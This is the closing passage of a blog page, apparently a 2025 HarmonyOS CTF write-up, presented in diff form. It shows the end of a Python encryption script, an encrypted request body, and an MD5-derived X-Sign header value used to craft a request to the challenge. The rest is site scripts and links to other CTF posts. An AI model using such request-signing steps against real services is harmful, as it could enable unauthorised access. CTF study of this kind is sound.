+</span></span><span class="line"><span class="cl">        <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;加密结果:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;错误: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>请求体</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;data&#34;: &#34;DDbony24lOqINuerJvtjH/+0I2AsdrKWwFQlp24oZ6P/DzFUxp5r/++TdZpItijaDLVJwG5E3Cy6CSFYQhq/3sB6S9QOGQ2y3i1U5aJQ2N+sU/WpFg9D4eY9YR85T0TeKwV8wIHQPQu8a4YAYcvEY7/2gs0AU+ud8f+j+uVvlj0piv5phItu0HjRPQtX7Q1p6RjoE92M6MsRJVK9Db7MSTVRL0LwczSUueGHLi8fArA8lwGcfGsl2/KKpe8KtmorFTndkkiuV2QoAC1P+r3u7vH5GfmWnyBl+xrC3ZccIC4CnVptvy32DNJ1GlZWHFh7PtKZ7ok72tZcEZoyKC9s8w==&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>md5得到X-Sign</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175502294.png"
+	width="1446"
+	height="331"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175502294_hu4556765353166186423.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175502294_hu15214223357491719848.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608175502294"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="436"
+		data-flex-basis="1048px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">85833e20b047b21daa90eee6c3c602b3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175531159.png"
+	width="1870"
+	height="706"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175531159_hu8961755117705934756.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608175531159_hu15607767926900242800.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608175531159"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2025dasctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025dasctfwp/1.2feb0258814dd14d6c19f8ab8c222dba.png" 
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 2025DASCTFwp"
+                        
+                        data-hash="md5-L&#43;sCWIFN0U1sGfirjCItug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025DASCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/1.4b0e18f0797c9c902f99f705eb5e74cb.jpg" 
+                        width="1024" 
+                        height="1024" 
+                        loading="lazy"
+                        alt="Featured image of post 2025D^3CTF复现"
+                        
+                        data-hash="md5-Sw4Y8Hl8nJAvmfcF6150yw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025D^3CTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025minilctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025MiniLCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025tgctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025tgctf%E5%A4%8D%E7%8E%B0/1.8a72782d13ca5196f24890ce1e021ab3.png" 
+                        width="1440" 
+                        height="1200" 
+                        loading="lazy"
+                        alt="Featured image of post 2025TGCTF复现"
+                        
+                        data-hash="md5-inJ4LRPKUZbySJDOHgIasw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025TGCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2024nctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.jpg" loading="lazy" data-key="" data-hash="/1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024NCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
